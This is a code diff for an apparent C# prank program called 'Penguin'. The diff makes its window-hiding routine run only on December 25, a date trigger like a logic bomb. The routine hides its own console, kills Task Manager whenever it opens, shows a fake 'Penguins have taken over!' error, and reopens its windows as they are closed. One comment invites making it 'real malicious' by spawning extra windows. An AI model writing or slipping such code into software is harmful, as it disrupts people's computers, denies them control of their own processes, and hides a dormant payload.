@@ -181,71 +181,76 @@ class Penguin
 
     static void WindowHidden()
     {
-        int currWindowCount = 0;
-        // 'lastPengCount' set to 2 as a minimum to account for host process and creation of one hidden window
-        int minPengWindows = 2;
-        int lastSecond = -1;
-        int currSecond = -1;
-        int windowDifference;
-        int i;
+        DateTime today = DateTime.Today;
 
-        while (true)
+        if (today.Month == 12 && today.Day == 25)
         {
-            currSecond = DateTime.Now.Second;
+            int currWindowCount = 0;
+            // 'lastPengCount' set to 2 as a minimum to account for host process and creation of one hidden window
+            int minPengWindows = 2;
+            int lastSecond = -1;
+            int currSecond = -1;
+            int windowDifference;
+            int i;
 
-            if (lastSecond != currSecond)
+            while (true)
             {
-                Console.SetWindowSize(1, 1);
+                currSecond = DateTime.Now.Second;
 
-                // settings i know:
-                // 0 = hidden
-                // 5 = shown
-                ShowWindow(GetConsoleWindow(), 0);
-                lastSecond = currSecond;
-
-                if (currWindowCount > minPengWindows)
+                if (lastSecond != currSecond)
                 {
-                    minPengWindows = currWindowCount;
-                }
+                    Console.SetWindowSize(1, 1);
 
-                currWindowCount = 0;
+                    // settings i know:
+                    // 0 = hidden
+                    // 5 = shown
+                    ShowWindow(GetConsoleWindow(), 0);
+                    lastSecond = currSecond;
 
-                foreach (Process process in Process.GetProcesses())
-                {
-                    switch (process.ProcessName)
+                    if (currWindowCount > minPengWindows)
                     {
-                        case TITLE:
-                            currWindowCount++;
-                            break;
-
-                        case "Taskmgr":
-                            try
-                            {
-                                // Starting the process killer and message box
-                                // in a new thread to avoid the thread from
-                                // stopping while the message box is open.
-                                new Thread(() =>
-                                {
-                                    process.Kill();
-                                    MessageBox.Show("Task Manager Error: Penguins have taken over!");
-                                }).Start();
-                            }
-                            catch (Exception) { }
-                            break;
+                        minPengWindows = currWindowCount;
                     }
-                }
 
-                windowDifference = minPengWindows - currWindowCount;
+                    currWindowCount = 0;
 
-                // For each window that doesn't exist...
-                for (i = 0; i < windowDifference; i++)
-                {
-                    // Create a new window
-                    CreateDisplayWindow();
+                    foreach (Process process in Process.GetProcesses())
+                    {
+                        switch (process.ProcessName)
+                        {
+                            case TITLE:
+                                currWindowCount++;
+                                break;
 
-                    // IF YOU WANNA BE REAL MALICIOUS
-                    // CREATE MORE THAN ONE WINDOW
-                    // FOR EACH CLOSED WINDOW
+                            case "Taskmgr":
+                                try
+                                {
+                                    // Starting the process killer and message box
+                                    // in a new thread to avoid the thread from
+                                    // stopping while the message box is open.
+                                    new Thread(() =>
+                                    {
+                                        process.Kill();
+                                        MessageBox.Show("Task Manager Error: Penguins have taken over!");
+                                    }).Start();
+                                }
+                                catch (Exception) { }
+                                break;
+                        }
+                    }
+
+                    windowDifference = minPengWindows - currWindowCount;
+
+                    // For each window that doesn't exist...
+                    for (i = 0; i < windowDifference; i++)
+                    {
+                        // Create a new window
+                        CreateDisplayWindow();
+
+                        // IF YOU WANNA BE REAL MALICIOUS
+                        // CREATE MORE THAN ONE WINDOW
+                        // FOR EACH CLOSED WINDOW
+                    }
                 }
             }
         }
